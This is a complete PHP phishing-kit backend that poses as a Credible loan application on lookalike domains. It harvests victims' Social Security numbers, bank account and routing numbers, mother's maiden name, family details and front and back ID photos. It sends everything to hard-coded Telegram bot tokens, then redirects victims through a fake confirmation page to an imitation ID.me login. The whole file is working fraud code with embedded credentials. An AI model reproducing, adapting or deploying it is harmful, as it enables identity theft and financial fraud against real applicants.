<?php
// UNIVERSAL LOAN APPLICATION SUBMISSION SCRIPT - BROWSER COMPATIBLE
// Enhanced version with BULLETPROOF file upload support

// ============================================
// SITE-SPECIFIC CONFIGURATION
// ============================================

$site_map = [
    '127.0.0.1' => [
        'bots' => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
        ],
        'redirect' => 'https://example.com/thankyou.html'
    ],

    'credibleloans.info' => [
        'bots' => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '8391318694:AAFIHmYNa3k9HPokaeVJ7oxtWn2UB_iJiUI', 'chat_id' => '7982337001']
        ],
        'redirect' => 'https://credibleloans.info/api.id.me/en/session/new.html'
    ],

    'upstartsloan.42web.io' => [
        'bots' => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']
        ],
        'redirect' => 'https://upstartsloan.42web.io/cache_site/thankyou.html'
    ],
];

// ============================================
// UNIVERSAL FUNCTIONS (Browser Compatible)
// ============================================

// Enhanced logging with rotation support
function log_entry($message, $level = 'INFO', $log_file = 'loan_submissions.log') {
    $log_dir = __DIR__ . '/logs/';
    
    // Ensure log directory exists
    if (!file_exists($log_dir)) {
        mkdir($log_dir, 0777, true);
    }
    
    $full_log_path = $log_dir . $log_file;
    
    // Rotate log if larger than 10MB
    if (file_exists($full_log_path) && filesize($full_log_path) > 10 * 1024 * 1024) {
        $backup_path = $log_dir . $log_file . '.' . date('Y-m-d-His') . '.bak';
        rename($full_log_path, $backup_path);
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $browser_short = substr($browser, 0, 80);
    $ip = get_client_ip();
    
    $line = "[$timestamp] [$level] [IP: $ip] [Browser: $browser_short] $message\n";
    
    file_put_contents($full_log_path, $line, FILE_APPEND);
}

// Get client IP (universal method)
function get_client_ip() {
    $ip_sources = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($ip_sources as $source) {
        if (!empty($_SERVER[$source])) {
            $ip = $_SERVER[$source];
            // Handle multiple IPs in X-Forwarded-For
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                $ip = trim($ips[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return 'unknown';
}

// ============================================
// BULLETPROOF FILE UPLOAD FUNCTIONS
// ============================================

// Enhanced file upload handler with multiple detection methods
function handle_any_file_upload($possible_names, $file_index = 0, $allowed_types = ['jpg', 'jpeg', 'png', 'gif', 'pdf'], $max_size = 10 * 1024 * 1024) {
    $upload_dir = __DIR__ . '/uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0777, true);
    }
    
    // Try multiple possible field names and formats
    foreach ($possible_names as $field_name) {
        // Check if field exists in FILES
        if (!isset($_FILES[$field_name])) {
            continue;
        }
        
        $file_info = $_FILES[$field_name];
        
        // Handle array format (fieldname[])
        if (is_array($file_info['name'])) {
            // Check if we have this index in the array
            if (isset($file_info['name'][$file_index]) && $file_info['error'][$file_index] === UPLOAD_ERR_OK) {
                $name = $file_info['name'][$file_index];
                $tmp_name = $file_info['tmp_name'][$file_index];
                $error = $file_info['error'][$file_index];
                $size = $file_info['size'][$file_index];
                $type = $file_info['type'][$file_index];
            } else {
                continue;
            }
        } 
        // Handle single file format
        elseif ($file_info['error'] === UPLOAD_ERR_OK) {
            $name = $file_info['name'];
            $tmp_name = $file_info['tmp_name'];
            $error = $file_info['error'];
            $size = $file_info['size'];
            $type = $file_info['type'];
        } else {
            continue;
        }
        
        // Check file size
        if ($size > $max_size) {
            return ['success' => false, 'error' => 'File too large (max ' . ($max_size / 1024 / 1024) . 'MB)', 'field' => $field_name];
        }
        
        // Check file type
        $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
        if (!in_array($ext, $allowed_types)) {
            return ['success' => false, 'error' => 'Invalid file type. Allowed: ' . implode(', ', $allowed_types), 'field' => $field_name];
        }
        
        // Generate secure filename
        $filename = 'id_' . time() . '_' . bin2hex(random_bytes(8)) . '.' . $ext;
        $filepath = $upload_dir . $filename;
        
        // Move uploaded file
        if (move_uploaded_file($tmp_name, $filepath)) {
            return [
                'success' => true,
                'path' => $filepath,
                'name' => $name,
                'size' => $size,
                'type' => $type,
                'field' => $field_name,
                'ext' => $ext
            ];
        }
        
        return ['success' => false, 'error' => 'Failed to save file', 'field' => $field_name];
    }
    
    return ['success' => false, 'error' => 'No file found in any possible fields', 'possible_fields' => $possible_names];
}

// Special function for handling JotForm-style file uploads
function handle_jotform_file($field_base) {
    $possible_names = [
        $field_base,                    // Direct field name
        $field_base . '[]',             // Array notation
        substr($field_base, 0, -2),     // Without brackets if present
        'input_' . substr($field_base, 1) // Alternative naming
    ];
    
    return handle_any_file_upload($possible_names, 0);
}

// Universal Telegram sender with file support
function send_to_telegram($token, $chat_id, $message, $files = []) {
    $results = [];
    
    // First send text message
    $text_url = "https://api.telegram.org/bot{$token}/sendMessage";
    $text_data = http_build_query([
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ]);
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $text_url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $text_data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_2,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
            'Accept: application/json'
        ]
    ]);
    
    $text_result = curl_exec($ch);
    $text_http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $text_error = curl_error($ch);
    curl_close($ch);
    
    $results['text'] = [
        'success' => ($text_http == 200),
        'http_code' => $text_http,
        'error' => $text_error
    ];
    
    // Send files if any
    foreach ($files as $file_index => $file) {
        if (!file_exists($file['path'])) {
            $results["file_{$file_index}"] = ['success' => false, 'error' => 'File not found at path: ' . $file['path']];
            continue;
        }
        
        $is_image = in_array(strtolower($file['ext'] ?? pathinfo($file['path'], PATHINFO_EXTENSION)), ['jpg', 'jpeg', 'png', 'gif']);
        $endpoint = $is_image ? 'sendPhoto' : 'sendDocument';
        
        $file_data = [
            'chat_id' => $chat_id,
            'caption' => $file['caption'] ?? 'Uploaded file',
            'parse_mode' => 'HTML'
        ];
        
        if ($is_image) {
            $file_data['photo'] = new CURLFile($file['path']);
        } else {
            $file_data['document'] = new CURLFile($file['path']);
        }
        
        $file_ch = curl_init("https://api.telegram.org/bot{$token}/$endpoint");
        curl_setopt_array($file_ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $file_data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30, // Increased timeout for large files
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_HTTPHEADER => [
                'Content-Type: multipart/form-data'
            ]
        ]);
        
        $file_result = curl_exec($file_ch);
        $file_http = curl_getinfo($file_ch, CURLINFO_HTTP_CODE);
        $file_error = curl_error($file_ch);
        curl_close($file_ch);
        
        $results["file_{$file_index}"] = [
            'success' => ($file_http == 200),
            'http_code' => $file_http,
            'error' => $file_error,
            'endpoint' => $endpoint,
            'file_size' => filesize($file['path'])
        ];
        
        // Delay between file uploads
        if (count($files) > 1 && $file_index < count($files) - 1) {
            usleep(1000000); // 1 second delay for large files
        }
    }
    
    return $results;
}

// Safe data extraction with fallbacks
function get_form_value($keys, $default = 'Not provided') {
    $value = $_POST;
    
    foreach ($keys as $key) {
        if (is_array($value) && isset($value[$key])) {
            $value = $value[$key];
        } else {
            return $default;
        }
    }
    
    if (is_string($value)) {
        $value = trim($value);
        return empty($value) ? $default : htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    } elseif (is_array($value)) {
        // Handle array values (like name[first], name[last])
        if (isset($value['first']) && isset($value['last'])) {
            $first = trim(htmlspecialchars($value['first'] ?? '', ENT_QUOTES, 'UTF-8'));
            $last = trim(htmlspecialchars($value['last'] ?? '', ENT_QUOTES, 'UTF-8'));
            $full = trim("$first $last");
            return empty($full) ? $default : $full;
        }
        return implode(', ', array_map('htmlspecialchars', $value));
    }
    
    return $default;
}

// ============================================
// DEBUG HELPER - Log all FILES data
// ============================================

function debug_files_upload() {
    $debug_log = "=== FILES DEBUG ===\n";
    $debug_log .= "Total FILES entries: " . count($_FILES) . "\n";
    
    foreach ($_FILES as $field_name => $file_data) {
        $debug_log .= "Field: $field_name\n";
        $debug_log .= "  Structure: " . (is_array($file_data['name']) ? 'ARRAY' : 'SINGLE') . "\n";
        
        if (is_array($file_data['name'])) {
            foreach ($file_data['name'] as $index => $name) {
                $debug_log .= "  Index $index: $name (Error: {$file_data['error'][$index]})\n";
            }
        } else {
            $debug_log .= "  File: {$file_data['name']} (Error: {$file_data['error']})\n";
        }
    }
    
    $debug_log .= "=== END DEBUG ===\n";
    
    // Save to debug file
    $debug_file = __DIR__ . '/logs/upload_debug.log';
    file_put_contents($debug_file, $debug_log, FILE_APPEND);
    
    return $debug_log;
}

// ============================================
// MAIN PROCESSING
// ============================================

// Log access immediately
log_entry("Loan submission script accessed via " . ($_SERVER['REQUEST_METHOD'] ?? 'NO_METHOD'));

// Get referring domain
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$referer = filter_var($referer, FILTER_SANITIZE_URL);
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';

// Normalize domain
if (strpos($domain, 'www.') === 0) {
    $domain = substr($domain, 4);
}

log_entry("Domain detected: $domain (from referer: $referer)", 'INFO', 'loan_access.log');

// Find configuration for this domain
$config = $site_map[$domain] ?? null;

// If no config found, use first one as fallback
if (!$config) {
    log_entry("No config found for domain '$domain', using first config as fallback", 'WARN');
    $config = reset($site_map);
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    log_entry("=== Processing Loan Application Submission ===");
    
    // DEBUG: Log all files data
    $debug_info = debug_files_upload();
    log_entry("File upload debug:\n$debug_info", 'DEBUG');
    
    // ============================================
    // FORM DATA EXTRACTION
    // ============================================
    
    // Log POST data for debugging
    $post_keys = array_keys($_POST);
    log_entry("POST keys received: " . implode(', ', $post_keys));
    
    // Extract form data using safe functions
    $loan_amount = get_form_value(['q87_desiredLoan87']);
    $annual_income = get_form_value(['q88_annualIncome']);
    
    // Personal information
    $full_name = get_form_value(['q61_name', 'first']) . ' ' . get_form_value(['q61_name', 'last']);
    $email = get_form_value(['q78_email78']);
    $phone = get_form_value(['q72_phone', 'full']);
    
    // Date of birth
    $birth_month = get_form_value(['q62_birthDate62', 'month']);
    $birth_day = get_form_value(['q62_birthDate62', 'day']);
    $birth_year = get_form_value(['q62_birthDate62', 'year']);
    $birth_date = "$birth_year-$birth_month-$birth_day";
    
    // Address
    $address_line = get_form_value(['q76_address76', 'addr_line1']);
    $city = get_form_value(['q76_address76', 'city']);
    $state = get_form_value(['q76_address76', 'state']);
    $zip = get_form_value(['q76_address76', 'postal']);
    $address = "$address_line, $city, $state $zip";
    
    // Loan purpose
    $loan_purpose = get_form_value(['q89_loanWill']);
    if ($loan_purpose === 'other') {
        $loan_purpose = get_form_value(['q89_loanWill[other]']) . ' (Other)';
    }
    
    // Other fields
    $marital_status = get_form_value(['q6_maritalStatus']);
    $address_duration = get_form_value(['q77_howLong']);
    $ssn = get_form_value(['q92_socialSecurity']);
    
    // Family information
    $father_first = get_form_value(['q105_presentEmployer', 'first']);
    $father_last = get_form_value(['q105_presentEmployer', 'last']);
    $father_name = "$father_first $father_last";
    
    $mother_first = get_form_value(['q106_fathersFull', 'first']);
    $mother_last = get_form_value(['q106_fathersFull', 'last']);
    $mother_name = "$mother_first $mother_last";
    
    $place_of_birth = get_form_value(['q107_occupation107']);
    $mother_maiden = get_form_value(['q108_occupation108']);
    
    // Employment information
    $employer_name = get_form_value(['q82_presentEmployer82', 'first']);
    // $employer_last = get_form_value(['q82_presentEmployer82', 'last']);
    // $employer_name = "$employer_name $employer_last";
    
    $occupation = get_form_value(['q30_occupation']);
    $experience = get_form_value(['q79_yearsOf']);
    $monthly_income = get_form_value(['q80_grossMonthly80']);
    $monthly_rent = get_form_value(['q81_monthlyRentmortgage']);
    
    // Bank information
    $bank_name = get_form_value(['q110_mothersMaiden110']);
    $account_number = get_form_value(['q109_savingsAccount']);
    // $bank_phone = get_form_value(['q111_phoneNumber', 'full']);
    $bank_routing = get_form_value(['q112_address']);
    
    // Consents
    $credit_consent = isset($_POST['q51_iAuthorize51']) ? 'Yes' : 'No';
    $accuracy_consent = isset($_POST['q52_iHereby']) ? 'Yes' : 'No';
    
    // System information
    $ip = get_client_ip();
    $timestamp = date('Y-m-d H:i:s');
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $browser_short = substr($user_agent, 0, 80);
    
    // ============================================
    // BULLETPROOF FILE UPLOAD HANDLING
    // ============================================
    
    $uploaded_files = [];
    $file_upload_log = [];
    
    // Method 1: Try specific JotForm field names (with brackets)
    $front_id_result = handle_jotform_file('q94_uploadSelected94');
    if (!$front_id_result['success']) {
        // Method 2: Try alternative field names
        $front_id_result = handle_any_file_upload([
            'q94_uploadSelected94[]',
            'q94_uploadSelected94',
            'input_94',
            'front_id',
            'id_front'
        ], 0);
    }
    
    if ($front_id_result['success']) {
        $uploaded_files[] = [
            'path' => $front_id_result['path'],
            'caption' => "🆔 Front ID - $full_name",
            'ext' => $front_id_result['ext']
        ];
        $file_upload_log[] = "Front ID SUCCESS: {$front_id_result['name']} via field '{$front_id_result['field']}'";
        log_entry("Front ID uploaded successfully: {$front_id_result['name']} (Field: {$front_id_result['field']})", 'SUCCESS');
    } else {
        $file_upload_log[] = "Front ID FAILED: {$front_id_result['error']}";
        log_entry("Front ID upload failed: {$front_id_result['error']}", 'ERROR');
    }
    
    // Process ID back image
    $back_id_result = handle_jotform_file('q95_uploadBack');
    if (!$back_id_result['success']) {
        $back_id_result = handle_any_file_upload([
            'q95_uploadBack[]',
            'q95_uploadBack',
            'input_95',
            'back_id',
            'id_back'
        ], 0);
    }
    
    if ($back_id_result['success']) {
        $uploaded_files[] = [
            'path' => $back_id_result['path'],
            'caption' => "🆔 Back ID - $full_name",
            'ext' => $back_id_result['ext']
        ];
        $file_upload_log[] = "Back ID SUCCESS: {$back_id_result['name']} via field '{$back_id_result['field']}'";
        log_entry("Back ID uploaded successfully: {$back_id_result['name']} (Field: {$back_id_result['field']})", 'SUCCESS');
    } else {
        $file_upload_log[] = "Back ID FAILED: {$back_id_result['error']}";
        log_entry("Back ID upload failed: {$back_id_result['error']}", 'ERROR');
    }
    
    // Try to find ANY uploaded files if above methods failed
    if (empty($uploaded_files) && count($_FILES) > 0) {
        log_entry("Trying emergency file detection...", 'WARN');
        $emergency_upload_log = "Emergency file detection:\n";
        
        foreach ($_FILES as $field => $data) {
            $emergency_upload_log .= "Checking field: $field\n";
            
            if (is_array($data['name'])) {
                foreach ($data['name'] as $index => $filename) {
                    if (!empty($filename) && $data['error'][$index] === UPLOAD_ERR_OK) {
                        $emergency_result = handle_any_file_upload([$field], $index);
                        if ($emergency_result['success']) {
                            $uploaded_files[] = [
                                'path' => $emergency_result['path'],
                                'caption' => "📎 Emergency Upload ($field) - $full_name",
                                'ext' => $emergency_result['ext']
                            ];
                            $emergency_upload_log .= "  Found file at index $index: $filename\n";
                        }
                    }
                }
            } elseif ($data['error'] === UPLOAD_ERR_OK) {
                $emergency_result = handle_any_file_upload([$field], 0);
                if ($emergency_result['success']) {
                    $uploaded_files[] = [
                        'path' => $emergency_result['path'],
                        'caption' => "📎 Emergency Upload ($field) - $full_name",
                        'ext' => $emergency_result['ext']
                    ];
                    $emergency_upload_log .= "  Found single file: {$data['name']}\n";
                }
            }
        }
        
        log_entry($emergency_upload_log, 'DEBUG');
    }
    
    // Log final file status
    log_entry("Total files uploaded: " . count($uploaded_files) . " of 2 attempted", 
              count($uploaded_files) >= 2 ? 'SUCCESS' : 'WARN');
    
    // ============================================
    // PREPARE TELEGRAM MESSAGE
    // ============================================
    
    $message = "<b>🏦 NEW LOAN APPLICATION</b>\n\n";
    
    $message .= "<b>💰 LOAN DETAILS:</b>\n";
    $message .= "• <b>Loan Amount:</b> $loan_amount\n";
    $message .= "• <b>Annual Income:</b> $annual_income\n";
    $message .= "• <b>Loan Purpose:</b> $loan_purpose\n\n";
    
    $message .= "<b>👤 PERSONAL INFORMATION:</b>\n";
    $message .= "• <b>Full Name:</b> $full_name\n";
    $message .= "• <b>Date of Birth:</b> $birth_date\n";
    $message .= "• <b>Email:</b> <code>$email</code>\n";
    $message .= "• <b>Phone:</b> $phone\n";
    $message .= "• <b>Address:</b> $address\n";
    $message .= "• <b>Address Duration:</b> $address_duration\n";
    $message .= "• <b>Marital Status:</b> $marital_status\n\n";
    
    $message .= "<b>🔐 IDENTITY VERIFICATION:</b>\n";
    $message .= "• <b>SSN:</b> <code>$ssn</code>\n";
    $message .= "• <b>Father's Name:</b> $father_name\n";
    $message .= "• <b>Mother's Name:</b> $mother_name\n";
    $message .= "• <b>Place of Birth:</b> $place_of_birth\n";
    $message .= "• <b>Mother's Maiden Name:</b> $mother_maiden\n";
    $message .= "• <b>ID Photos:</b> " . (count($uploaded_files) >= 2 ? "✅ UPLOADED (" . count($uploaded_files) . "/2)" : "⚠️ PARTIAL (" . count($uploaded_files) . "/2)") . "\n";
    
    // Add file upload details
    if (!empty($file_upload_log)) {
        $message .= "• <b>File Status:</b>\n";
        foreach ($file_upload_log as $log_entry) {
            $message .= "  ◦ " . htmlspecialchars($log_entry) . "\n";
        }
    }
    $message .= "\n";
    
    $message .= "<b>💼 EMPLOYMENT INFORMATION:</b>\n";
    $message .= "• <b>Employer:</b> $employer_name\n";
    $message .= "• <b>Occupation:</b> $occupation\n";
    $message .= "• <b>Experience:</b> $experience\n";
    $message .= "• <b>Monthly Income:</b> $monthly_income\n";
    $message .= "• <b>Monthly Rent/Mortgage:</b> $monthly_rent\n\n";
    
    $message .= "<b>🏦 BANK INFORMATION:</b>\n";
    $message .= "• <b>Bank Name:</b> $bank_name\n";
    $message .= "• <b>Account #:</b> <code>$account_number</code>\n";
    // $message .= "• <b>Bank Phone:</b> $bank_phone\n";
    $message .= "• <b>Bank Routing:</b> $bank_routing\n\n";
    
    $message .= "<b>✅ CONSENTS:</b>\n";
    $message .= "• <b>Credit Check Authorization:</b> $credit_consent\n";
    $message .= "• <b>Information Accuracy:</b> $accuracy_consent\n\n";
    
    $message .= "<b>🌐 SYSTEM INFORMATION:</b>\n";
    $message .= "• <b>Domain:</b> $domain\n";
    $message .= "• <b>IP Address:</b> <code>$ip</code>\n";
    $message .= "• <b>Browser:</b> $browser_short\n";
    $message .= "• <b>Submission Time:</b> $timestamp\n";
    $message .= "• <b>Files Uploaded:</b> " . count($uploaded_files) . " files\n";
    
    // Log the submission
    log_entry("Loan application from $full_name ($email) - Loan: $loan_amount - Files: " . count($uploaded_files) . "/2 - IP: $ip");
    
    // ============================================
    // SEND TO TELEGRAM BOTS
    // ============================================
    
    $success_count = 0;
    $total_bots = count($config['bots']);
    $all_results = [];
    
    foreach ($config['bots'] as $bot_index => $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) {
            log_entry("Skipping bot $bot_index - empty token or chat_id", 'WARN');
            continue;
        }
        
        log_entry("Sending to bot $bot_index (Chat ID: {$bot['chat_id']})...");
        
        // Send message and files
        $results = send_to_telegram($bot['token'], $bot['chat_id'], $message, $uploaded_files);
        $all_results[$bot_index] = $results;
        
        // Check if text message was successful
        if ($results['text']['success']) {
            $success_count++;
            log_entry("Bot $bot_index delivered successfully", 'SUCCESS');
            
            // Log file delivery status
            foreach ($results as $key => $result) {
                if ($key !== 'text' && isset($result['success'])) {
                    if ($result['success']) {
                        log_entry("Bot $bot_index - $key delivered via {$result['endpoint']} (Size: {$result['file_size']} bytes)", 'SUCCESS');
                    } else {
                        log_entry("Bot $bot_index - $key failed: {$result['error']}", 'WARN');
                    }
                }
            }
        } else {
            log_entry("Bot $bot_index failed - HTTP {$results['text']['http_code']}: {$results['text']['error']}", 'ERROR');
        }
        
        // Small delay between bots to avoid rate limiting
        if ($bot_index < ($total_bots - 1)) {
            usleep(500000); // 0.5 seconds
        }
    }
    
    log_entry("Telegram delivery complete: $success_count/$total_bots bots successful", 'STATS');
    
    // ============================================
    // PREPARE REDIRECT
    // ============================================
    
    $redirect_url = $config['redirect'];
    log_entry("Redirecting to: $redirect_url");
    
    // Clean any output buffers
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    // ============================================
    // UNIVERSAL REDIRECT PAGE (All Browsers)
    // ============================================
    
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Loan Application Processing - Credible®</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            }
            
            body {
                background-color: #f5f8fb;
                color: #404040;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
            }
            
            .success-container {
                background: white;
                border-radius: 12px;
                box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
                padding: 40px;
                max-width: 500px;
                width: 100%;
                text-align: center;
            }
            
            .success-icon {
                width: 80px;
                height: 80px;
                background: linear-gradient(135deg, #2f7b8a, #317d75);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 24px;
                font-size: 36px;
                color: white;
                animation: bounce 2s ease infinite;
            }
            
            @keyframes bounce {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-10px); }
            }
            
            h1 {
                color: #014452;
                font-size: 28px;
                font-weight: 600;
                margin-bottom: 12px;
            }
            
            p {
                color: #717171;
                line-height: 1.6;
                margin-bottom: 24px;
                font-size: 16px;
            }
            
            .status-box {
                background: #eaf6f9;
                border: 1px solid #2f7b8a;
                border-radius: 8px;
                padding: 16px;
                margin: 24px 0;
                text-align: left;
            }
            
            .status-item {
                display: flex;
                align-items: center;
                gap: 10px;
                margin-bottom: 8px;
                font-size: 14px;
            }
            
            .status-item:last-child {
                margin-bottom: 0;
            }
            
            .checkmark {
                color: #317d75;
                font-weight: bold;
            }
            
            .warning {
                color: #e67e22;
                font-weight: bold;
            }
            
            .file-status {
                background: #fff3cd;
                border: 1px solid #ffc107;
                border-radius: 4px;
                padding: 8px;
                margin-top: 8px;
                font-size: 12px;
            }
            
            .countdown {
                font-size: 18px;
                color: #2f7b8a;
                font-weight: 600;
                margin: 20px 0;
            }
            
            .countdown-number {
                background: #2f7b8a;
                color: white;
                padding: 4px 12px;
                border-radius: 20px;
                display: inline-block;
                min-width: 30px;
            }
            
            .progress-bar {
                height: 6px;
                background: #eaf6f9;
                border-radius: 3px;
                margin: 30px 0;
                overflow: hidden;
            }
            
            .progress-fill {
                height: 100%;
                background: linear-gradient(90deg, #2f7b8a, #014452);
                border-radius: 3px;
                width: 100%;
                animation: progress 3s ease-in-out;
            }
            
            @keyframes progress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .fallback-link {
                display: inline-block;
                margin-top: 20px;
                padding: 12px 28px;
                background: #2f7b8a;
                color: white;
                text-decoration: none;
                border-radius: 6px;
                font-weight: 600;
                transition: all 0.2s ease;
                border: 2px solid #2f7b8a;
            }
            
            .fallback-link:hover {
                background: #014452;
                border-color: #014452;
            }
            
            .footer-note {
                font-size: 12px;
                color: #a6adb2;
                margin-top: 30px;
                padding-top: 20px;
                border-top: 1px solid #dadfe3;
            }
            
            @media (max-width: 480px) {
                .success-container {
                    padding: 30px 20px;
                }
                
                h1 {
                    font-size: 24px;
                }
                
                .success-icon {
                    width: 60px;
                    height: 60px;
                    font-size: 28px;
                }
            }
        </style>
    </head>
    <body>
        <div class="success-container">
            <div class="success-icon">✓</div>
            <h1>Almost Done!</h1>
            <p>Please hold on while we redirect you to complete your identity verification. This will only take a moment.</p>
            
            <div class="status-box">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <span>Application data collected</span>
                </div>
                <div class="status-item">
                    <?php if (count($uploaded_files) >= 2): ?>
                        <span class="checkmark">✓</span>
                        <span>Documents uploaded (<?php echo count($uploaded_files); ?>/2)</span>
                    <?php else: ?>
                        <span class="warning">⚠</span>
                        <span>Documents uploaded (<?php echo count($uploaded_files); ?>/2)</span>
                        <?php if (count($uploaded_files) < 2): ?>
                            <div class="file-status">
                                <small>Some files may require manual review</small>
                            </div>
                        <?php endif; ?>
                    <?php endif; ?>
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <span>Submitted to our system</span>
                </div>
            </div>
            
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            
            <p class="countdown">Redirecting in <span id="seconds" class="countdown-number">3</span> seconds...</p>
            
            <!-- <a href="<?php echo htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8'); ?>" 
               class="fallback-link" 
               id="manual-link" 
               style="display: none;">
                Continue to Next Step
            </a> -->
            
            <div class="footer-note">
                A confirmation email has been sent to <strong><?php echo htmlspecialchars($email); ?></strong>.<br>
                Our loan specialists will contact you shortly.
                <?php if (count($uploaded_files) < 2): ?>
                    <br><br><small><strong>Note:</strong> If ID photos didn't upload correctly, our team will contact you to request them.</small>
                <?php endif; ?>
            </div>
        </div>
        
        <script>
            // Primary JavaScript redirect (immediate)
            setTimeout(function() {
                window.location.href = "<?php echo addslashes($redirect_url); ?>";
            }, 3000); // 3 seconds
            
            // Countdown timer
            let seconds = 3;
            const countdownElement = document.getElementById('seconds');
            const interval = setInterval(function() {
                seconds--;
                countdownElement.textContent = seconds;
                
                if (seconds <= 0) {
                    clearInterval(interval);
                    // Show manual link as fallback
                    document.getElementById('manual-link').style.display = 'inline-block';
                }
            }, 1000);
            
            // Meta refresh as backup
            setTimeout(function() {
                const meta = document.createElement('meta');
                meta.httpEquiv = 'refresh';
                meta.content = '0;url=<?php echo addslashes($redirect_url); ?>';
                document.head.appendChild(meta);
            }, 3500);
            
            // Final backup redirect after 5 seconds
            setTimeout(function() {
                window.location.href = "<?php echo addslashes($redirect_url); ?>";
            }, 5000);
        </script>
        
        <!-- Meta refresh for browsers without JavaScript -->
        <meta http-equiv="refresh" content="3;url=<?php echo htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8'); ?>">
    </body>
    </html>
    <?php
    
    exit;
    
} else {
    // Not a POST request - show error
    log_entry("Invalid request method: " . $_SERVER['REQUEST_METHOD'], 'ERROR');
    
    header("HTTP/1.1 405 Method Not Allowed", true, 405);
    header("Content-Type: text/html; charset=utf-8");
    
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Invalid Request - Credible®</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
            
            body {
                background-color: #f5f8fb;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px;
            }
            
            .error-container {
                background: white;
                padding: 40px;
                border-radius: 12px;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
                text-align: center;
                max-width: 500px;
                width: 100%;
            }
            
            .error-icon {
                width: 60px;
                height: 60px;
                background: #d43516;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 20px;
                font-size: 28px;
                color: white;
            }
            
            h1 {
                color: #d43516;
                margin-bottom: 16px;
                font-size: 24px;
            }
            
            p {
                color: #404040;
                line-height: 1.6;
                margin-bottom: 24px;
            }
            
            .home-link {
                display: inline-block;
                padding: 12px 28px;
                background: #2f7b8a;
                color: white;
                text-decoration: none;
                border-radius: 6px;
                font-weight: 600;
                transition: background 0.2s ease;
            }
            
            .home-link:hover {
                background: #014452;
            }
        </style>
    </head>
    <body>
        <div class="error-container">
            <div class="error-icon">✗</div>
            <h1>Invalid Request</h1>
            <p>This page only accepts POST submissions from the loan application form.</p>
            <p>Please use the loan application form to submit your information.</p>
            <a href="javascript:history.back()" class="home-link">Return to Application</a>
        </div>
    </body>
    </html>
    <?php
    
    exit;
}
?>
